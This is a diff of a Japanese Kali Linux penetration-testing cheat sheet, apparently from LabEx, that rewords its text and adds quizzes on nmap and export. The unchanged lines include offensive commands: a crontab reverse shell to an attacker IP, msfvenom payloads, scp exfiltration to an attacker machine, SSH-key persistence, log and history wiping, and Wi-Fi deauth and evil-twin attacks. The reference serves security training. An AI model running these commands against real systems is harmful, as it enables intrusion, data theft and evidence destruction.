@@ -1,6 +1,6 @@
 ---
-title: 'Kali Linux チートシート'
-description: '必須コマンド、概念、ベストプラクティスを網羅した包括的なチートシートで Kali Linux を習得しましょう。'
+title: 'Kali Linux チートシート | LabEx'
+description: 'この包括的なチートシートで Kali Linux のペネトレーションテストを学ぶ。セキュリティツール、倫理的ハッキング、脆弱性スキャン、エクスプロイト、サイバーセキュリティテストのクイックリファレンス。'
 pdfUrl: '/cheatsheets/pdf/kali-linux-cheatsheet.pdf'
 ---
 
@@ -38,7 +38,7 @@ sudo apt install curl wget git
 
 ### ユーザー管理：`sudo useradd`
 
-セキュリティテストのためにユーザーアカウントを作成および管理します。
+セキュリティテスト用のユーザーアカウントを作成および管理します。
 
 ```bash
 # 新規ユーザーの追加
@@ -62,7 +62,7 @@ sudo systemctl start apache2
 sudo systemctl stop apache2
 # ブート時の有効化
 sudo systemctl enable ssh
-# サービスのステータス確認
+# サービスステータスの確認
 sudo systemctl status postgresql
 ```
 
@@ -94,6 +94,21 @@ export WORDLIST=/usr/share/wordlists/rockyou.txt
 env | grep TARGET
 ```
 
+<BaseQuiz id="kali-env-1" correct="C">
+  <template #question>
+    `export` を使用して設定された環境変数はどうなりますか？
+  </template>
+  
+  <BaseQuizOption value="A">システム再起動後も永続化する</BaseQuizOption>
+  <BaseQuizOption value="B">現在のファイルでのみ利用可能</BaseQuizOption>
+  <BaseQuizOption value="C" correct>現在のシェルとその子プロセスで利用可能</BaseQuizOption>
+  <BaseQuizOption value="D">グローバルなシステム変数である</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    `export` で設定された環境変数は、現在のシェルセッションとそのセッションから起動されたすべての子プロセスで利用可能になります。シェルセッションが終了すると失われますが、`.bashrc` などのシェル設定ファイルに追加すれば永続化できます。
+  </BaseQuizAnswer>
+</BaseQuiz>
+
 ### ツールのインストール：`apt install`
 
 追加のセキュリティツールと依存関係をインストールします。
@@ -116,7 +131,7 @@ ping スイープを使用してネットワーク上の稼働中のホストを
 ```bash
 # Ping スイープ
 nmap -sn 192.168.1.0/24
-# ARP スキャン（ローカルネットワーク）
+# ARP スキャン (ローカルネットワーク)
 nmap -PR 192.168.1.0/24
 # ICMP エコー スキャン
 nmap -PE 192.168.1.0/24
@@ -126,18 +141,33 @@ masscan --ping 192.168.1.0/24
 
 ### ポートスキャン：`nmap`
 
-ターゲットシステム上のオープンポートと実行中のサービスをスキャンします。
+ターゲットシステム上の開いているポートと実行中のサービスをスキャンします。
 
 ```bash
 # 基本的な TCP スキャン
 nmap 192.168.1.1
-# 詳細スキャン
+# 積極的なスキャン
 nmap -A 192.168.1.1
 # UDP スキャン
 nmap -sU 192.168.1.1
 # ステルス SYN スキャン
 nmap -sS 192.168.1.1
 ```
+
+<BaseQuiz id="kali-nmap-1" correct="B">
+  <template #question>
+    `nmap -sS` は何を行いますか？
+  </template>
+  
+  <BaseQuizOption value="A">UDP スキャンを実行する</BaseQuizOption>
+  <BaseQuizOption value="B" correct>ステルス SYN スキャン (半開スキャン) を実行する</BaseQuizOption>
+  <BaseQuizOption value="C">すべてのポートをスキャンする</BaseQuizOption>
+  <BaseQuizOption value="D">OS 検出を実行する</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    `-sS` フラグは、TCP ハンドシェイクを完了しないため、SYN スキャン（半開スキャンとも呼ばれる）を実行します。SYN パケットを送信し応答を分析することで、完全な TCP 接続スキャンよりもステルス性が高くなります。
+  </BaseQuizAnswer>
+</BaseQuiz>
 
 ### サービス列挙：`nmap -sV`
 
@@ -148,6 +178,22 @@ nmap -sS 192.168.1.1
 nmap -sV 192.168.1.1
 # OS検出
 nmap -O 192.168.1.1
+```
+
+<BaseQuiz id="kali-enumeration-1" correct="A">
+  <template #question>
+    `nmap -sV` は何を行いますか？
+  </template>
+  
+  <BaseQuizOption value="A" correct>開いているポートで実行されているサービスバージョンを検出する</BaseQuizOption>
+  <BaseQuizOption value="B">バージョン管理ポートのみをスキャンする</BaseQuizOption>
+  <BaseQuizOption value="C">脆弱なサービスのみを表示する</BaseQuizOption>
+  <BaseQuizOption value="D">OS 検出のみを実行する</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    `-sV` フラグはバージョン検出を有効にし、開いているポートをプローブして実行されているサービスとバージョンを特定します。これは特定のソフトウェアバージョンに関連する潜在的な脆弱性を特定するのに役立ちます。
+  </BaseQuizAnswer>
+</BaseQuiz>
 # スクリプトスキャン
 nmap -sC 192.168.1.1
 # 総合スキャン
@@ -156,7 +202,7 @@ nmap -sS -sV -O -A 192.168.1.1
 
 ## 情報収集と偵察
 
-### DNS 列挙：`dig`
+### DNS 列挙: `dig`
 
 DNS 情報を収集し、ゾーン転送を実行します。
 
@@ -171,9 +217,9 @@ dig @ns1.example.com example.com axfr
 dnsrecon -d example.com
 ```
 
-### Web 偵察：`dirb`
+### Web 偵察: `dirb`
 
-Web サーバー上の隠されたディレクトリとファイルを発見します。
+Web サーバー上の隠されたディレクトリとファイルを検出します。
 
 ```bash
 # ディレクトリ総当たり攻撃
@@ -184,9 +230,9 @@ dirb http://192.168.1.1 /usr/share/wordlists/dirbuster/directory-list-2.3-medium
 gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 ```
 
-### WHOIS 情報：`whois`
+### WHOIS 情報: `whois`
 
-ドメイン登録と所有者情報を収集します。
+ドメイン登録および所有者情報を収集します。
 
 ```bash
 # WHOIS ルックアップ
@@ -197,7 +243,7 @@ whois 8.8.8.8
 theharvester -d example.com -l 100 -b google
 ```
 
-### SSL/TLS 分析：`sslscan`
+### SSL/TLS 分析: `sslscan`
 
 SSL/TLS の設定と脆弱性を分析します。
 
@@ -210,7 +256,7 @@ testssl.sh https://example.com
 openssl s_client -connect example.com:443
 ```
 
-### SMB 列挙：`enum4linux`
+### SMB 列挙: `enum4linux`
 
 SMB 共有と NetBIOS 情報を列挙します。
 
@@ -225,7 +271,7 @@ smbclient //192.168.1.1/share
 nmap --script smb-vuln* 192.168.1.1
 ```
 
-### SNMP 列挙：`snmpwalk`
+### SNMP 列挙: `snmpwalk`
 
 SNMP プロトコルを介してシステム情報を収集します。
 
@@ -240,7 +286,7 @@ snmp-check 192.168.1.1
 
 ## 脆弱性分析とエクスプロイト
 
-### 脆弱性スキャン：`nessus`
+### 脆弱性スキャン: `nessus`
 
 自動化されたスキャナーを使用してセキュリティ脆弱性を特定します。
 
@@ -251,7 +297,7 @@ sudo systemctl start nessusd
 openvas-start
 # Nikto Web 脆弱性スキャナー
 nikto -h http://192.168.1.1
-# SQLインジェクションのための SQLmap
+# SQL インジェクションのための SQLmap
 sqlmap -u "http://example.com/page.php?id=1"
 ```
 
@@ -270,9 +316,9 @@ use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS 192.168.1.1
 ```
 
-### バッファオーバーフローテスト：`pattern_create`
+### バッファオーバーフローテスト: `pattern_create`
 
-バッファオーバーフローエクスプロイトのためのパターンを生成します。
+バッファオーバーフローエクスプロイトのためにパターンを生成します。
 
 ```bash
 # パターンの生成
@@ -281,7 +327,7 @@ pattern_create.rb -l 400
 pattern_offset.rb -l 400 -q EIP_value
 ```
 
-### カスタムエクスプロイト開発：`msfvenom`
+### カスタムエクスプロイト開発: `msfvenom`
 
 特定のターゲット向けにカスタムペイロードを作成します。
 
@@ -296,7 +342,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > 
 
 ## パスワード攻撃と認証情報テスト
 
-### 総当たり攻撃：`hydra`
+### 総当たり攻撃: `hydra`
 
 さまざまなサービスに対してログイン総当たり攻撃を実行します。
 
@@ -309,7 +355,7 @@ hydra -l admin -P passwords.txt 192.168.1.1 http-form-post "/login:username=^USE
 hydra -L users.txt -P passwords.txt ftp://192.168.1.1
 ```
 
-### ハッシュクラッキング：`hashcat`
+### ハッシュクラッキング: `hashcat`
 
 GPU アクセラレーションを使用してパスワードハッシュをクラックします。
 
@@ -324,10 +370,10 @@ hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt
 
 ### John the Ripper: `john`
 
-さまざまな攻撃モードを使用した従来のパスワードクラッキング。
+さまざまな攻撃モードによる従来のパスワードクラッキング。
 
 ```bash
-# パスワードファイルのクラック
+# パスワードファイルのクラッキング
 john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
 # クラックされたパスワードの表示
 john --show shadow.txt
@@ -337,12 +383,12 @@ john --incremental shadow.txt
 john --rules --wordlist=passwords.txt shadow.txt
 ```
 
-### ワードリスト生成：`crunch`
+### ワードリスト生成: `crunch`
 
 ターゲットを絞った攻撃のためにカスタムワードリストを作成します。
 
 ```bash
-# 4～8文字のワードリストを生成
+# 4～8 文字のワードリストを生成
 crunch 4 8 -o wordlist.txt
 # カスタム文字セット
 crunch 6 6 -t admin@ -o passwords.txt
@@ -352,7 +398,7 @@ crunch 8 8 -t @@@@%%%% -o mixed.txt
 
 ## ワイヤレスネットワークセキュリティテスト
 
-### モニターモード設定：`airmon-ng`
+### モニターモード設定: `airmon-ng`
 
 パケットキャプチャとインジェクションのためにワイヤレスアダプターを設定します。
 
@@ -365,9 +411,9 @@ sudo airmon-ng check kill
 sudo airmon-ng stop wlan0mon
 ```
 
-### ネットワークの発見：`airodump-ng`
+### ネットワークの発見: `airodump-ng`
 
-ワイヤレスネットワークとクライアントを検出し監視します。
+ワイヤレスネットワークとクライアントを検出および監視します。
 
 ```bash
 # すべてのネットワークのスキャン
@@ -378,20 +424,20 @@ sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
 sudo airodump-ng --encrypt WEP wlan0mon
 ```
 
-### WPA/WPA2 攻撃：`aircrack-ng`
+### WPA/WPA2 攻撃: `aircrack-ng`
 
 WPA/WPA2 暗号化されたネットワークに対して攻撃を実行します。
 
 ```bash
 # Deauth 攻撃
 sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
-# キャプチャされたハンドシェイクのクラック
+# キャプチャされたハンドシェイクのクラッキング
 aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
-# Reaver を使用した WPS 攻撃
+# Reaver による WPS 攻撃
 reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
 ```
 
-### Evil Twin 攻撃：`hostapd`
+### Evil Twin 攻撃: `hostapd`
 
 認証情報ハーベスティングのために不正なアクセスポイントを作成します。
 
@@ -406,12 +452,12 @@ ettercap -T -M arp:remote /192.168.1.0/24//
 
 ## Web アプリケーションセキュリティテスト
 
-### SQL インジェクションテスト：`sqlmap`
+### SQL インジェクションテスト: `sqlmap`
 
 SQL インジェクションの検出とエクスプロイトを自動化します。
 
 ```bash
-# 基本的な SQL インジェクション テスト
+# 基本的な SQL インジェクションテスト
 sqlmap -u "http://example.com/page.php?id=1"
 # POST パラメータのテスト
 sqlmap -u "http://example.com/login.php" --data="username=admin&password=test"
@@ -421,7 +467,7 @@ sqlmap -u "http://example.com/page.php?id=1" --dbs
 sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump
 ```
 
-### クロスサイトスクリプティング：`xsser`
+### クロスサイトスクリプティング: `xsser`
 
 Web アプリケーションの XSS 脆弱性をテストします。
 
@@ -434,33 +480,33 @@ xsser -u "http://example.com" --crawl=10
 xsser --url "http://example.com" --payload="<script>alert(1)</script>"
 ```
 
-### Burp Suite 統合：`burpsuite`
+### Burp Suite 統合: `burpsuite`
 
-包括的な Web アプリケーションセキュリティテストプラットフォーム。
+Web アプリケーションセキュリティテストのための包括的なプラットフォーム。
 
 ```bash
 # Burp Suite の開始
 burpsuite
 # プロキシの設定 (127.0.0.1:8080)
-# トラフィックキャプチャのためにブラウザプロキシを設定
+# トラフィックキャプチャのためにブラウザのプロキシを設定
 # 自動化された攻撃のために Intruder を使用
-# コンテンツ発見のために Spider を使用
+# コンテンツ検出のために Spider を使用
 ```
 
-### ディレクトリトラバーサル：`wfuzz`
+### ディレクトリトラバーサル: `wfuzz`
 
-ディレクトリトラバーサルとファイルインクルードの脆弱性をテストします。
+ディレクトリトラバーサルおよびファイルインクルージョン脆弱性をテストします。
 
 ```bash
-# ディレクトリファジング
+# ディレクトリのファジング
 wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.1.1/FUZZ
-# パラメータファジング
+# パラメータのファジング
 wfuzz -c -z file,payloads.txt "http://example.com/page.php?file=FUZZ"
 ```
 
 ## 侵入後の活動と権限昇格
 
-### システム列挙：`linpeas`
+### システム列挙: `linpeas`
 
 Linux システムの権限昇格のための自動化された列挙ツール。
 
@@ -471,15 +517,15 @@ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 chmod +x linpeas.sh
 # 列挙の実行
 ./linpeas.sh
-# Windows の代替: winPEAS.exe
+# Windows の代替：winPEAS.exe
 ```
 
-### 永続化メカニズム：`crontab`
+### 永続化メカニズム: `crontab`
 
 侵害されたシステムで永続性を確立します。
 
 ```bash
-# crontab の編集
+# Crontab の編集
 crontab -e
 # リバースシェルの追加
 @reboot /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
@@ -487,12 +533,12 @@ crontab -e
 echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
 ```
 
-### データ流出：`scp`
+### データ流出: `scp`
 
 侵害されたシステムから安全にデータを転送します。
 
 ```bash
-# 証拠ファイルを攻撃者マシンにコピー
+# ファイルを攻撃者マシンにコピー
 scp file.txt user@192.168.1.100:/tmp/
 # 圧縮して転送
 tar -czf data.tar.gz /home/user/documents
@@ -501,9 +547,9 @@ scp data.tar.gz attacker@192.168.1.100:/tmp/
 python3 -m http.server 8000
 ```
 
-### 痕跡の隠蔽：`history`
+### 痕跡の隠蔽: `history`
 
-侵害されたシステム上での活動の証拠を削除します。
+侵害されたシステム上での活動の証拠を消去します。
 
 ```bash
 # bash 履歴の消去
@@ -517,7 +563,7 @@ sudo rm /var/log/auth.log*
 
 ## デジタルフォレンジックと分析
 
-### ディスクイメージング：`dd`
+### ディスクイメージング: `dd`
 
 ストレージデバイスのフォレンジックイメージを作成します。
 
@@ -532,20 +578,20 @@ sudo mkdir /mnt/evidence
 sudo mount -o ro,loop /tmp/evidence.img /mnt/evidence
 ```
 
-### ファイル復元：`foremost`
+### ファイル復元: `foremost`
 
 ディスクイメージまたはドライブから削除されたファイルを復元します。
 
 ```bash
 # イメージからのファイル復元
 foremost -i evidence.img -o recovered/
-# 特定のファイルタイプの復元
+# 特定のファイルタイプ
 foremost -t jpg,png,pdf -i evidence.img -o photos/
 # PhotoRec の代替
 photorec evidence.img
 ```
 
-### メモリ分析：`volatility`
+### メモリ分析: `volatility`
 
 フォレンジック証拠のために RAM ダンプを分析します。
 
@@ -558,7 +604,7 @@ volatility -f memory.dump --profile=Win7SP1x64 pslist
 volatility -f memory.dump --profile=Win7SP1x64 procdump -p 1234 -D output/
 ```
 
-### ネットワークパケット分析：`wireshark`
+### ネットワークパケット分析: `wireshark`
 
 フォレンジック証拠のためにネットワークトラフィックキャプチャを分析します。
 
@@ -573,12 +619,12 @@ foremost -i capture.pcap -o extracted/
 
 ## レポート生成とドキュメント作成
 
-### スクリーンショットのキャプチャ：`gnome-screenshot`
+### スクリーンショットキャプチャ: `gnome-screenshot`
 
-体系的なスクリーンショットキャプチャで調査結果を文書化します。
+体系的なスクリーンショットキャプチャにより、調査結果を文書化します。
 
 ```bash
-# フルスクリーンショットのキャプチャ
+# フルスクリーンショット
 gnome-screenshot -f screenshot.png
 # ウィンドウのキャプチャ
 gnome-screenshot -w -f window.png
@@ -588,12 +634,12 @@ gnome-screenshot -d 5 -f delayed.png
 gnome-screenshot -a -f area.png
 ```
 
-### ログ管理：`script`
+### ログ管理: `script`
 
 ドキュメント作成のためにターミナルセッションを記録します。
 
 ```bash
-# セッションの記録開始
+# 記録セッションの開始
 script session.log
 # タイミング付きの記録
 script -T session.time session.log
@@ -601,7 +647,7 @@ script -T session.time session.log
 scriptreplay session.time session.log
 ```
 
-### レポートテンプレート：`reportlab`
+### レポートテンプレート: `reportlab`
 
 プロフェッショナルなペネトレーションテストレポートを生成します。
 
@@ -614,7 +660,7 @@ python3 generate_report.py
 pandoc report.md -o report.pdf
 ```
 
-### 証拠の整合性：`sha256sum`
+### 証拠の整合性: `sha256sum`
 
 暗号学的ハッシュを使用して証拠の連鎖を維持します。
 
@@ -629,9 +675,9 @@ find /evidence -type f -exec sha256sum {} \; > all_files.sha256
 
 ## システムメンテナンスと最適化
 
-### パッケージ管理：`apt`
+### パッケージ管理: `apt`
 
-システムパッケージとセキュリティツールを維持および更新します。
+システムパッケージとセキュリティツールのメンテナンスと更新を行います。
 
 ```bash
 # パッケージリストの更新
@@ -644,7 +690,7 @@ sudo apt install tool-name
 sudo apt autoremove
 ```
 
-### カーネルの更新：`uname`
+### カーネルアップデート: `uname`
 
 セキュリティパッチのためにシステムカーネルを監視および更新します。
 
@@ -659,9 +705,9 @@ sudo apt install linux-image-generic
 sudo apt autoremove --purge
 ```
 
-### ツールの検証：`which`
+### ツール検証: `which`
 
-ツールのインストールを確認し、実行可能ファイルを検索します。
+ツールのインストールを確認し、実行可能ファイルの場所を特定します。
 
 ```bash
 # ツールの場所の特定
@@ -672,7 +718,7 @@ command -v metasploit
 ls /usr/bin/ | grep -i security
 ```
 
-### リソース監視：`htop`
+### リソース監視: `htop`
 
 集中的なセキュリティテスト中にシステムリソースを監視します。
 
@@ -689,7 +735,7 @@ netstat -tulnp
 
 ## 必須の Kali Linux ショートカットとエイリアス
 
-### エイリアスの作成：`.bashrc`
+### エイリアスの作成: `.bashrc`
 
 頻繁に使用するタスクのために時間節約のコマンドショートカットを設定します。
 
@@ -705,7 +751,7 @@ alias msf='msfconsole -q'
 source ~/.bashrc
 ```
 
-### カスタム関数：`function`
+### カスタム関数: `function`
 
 一般的なワークフローのために高度なコマンドの組み合わせを作成します。
 
@@ -720,7 +766,7 @@ function pentest-setup() {
 }
 ```
 
-### キーボードショートカット：Terminal
+### キーボードショートカット: ターミナル
 
 より高速なナビゲーションのために必須のキーボードショートカットを習得します。
 
@@ -734,7 +780,7 @@ function pentest-setup() {
 # 上/下 - コマンド履歴の移動
 ```
 
-### 環境設定：`tmux`
+### 環境設定: `tmux`
 
 長時間実行されるタスクのために永続的なターミナルセッションを設定します。
 
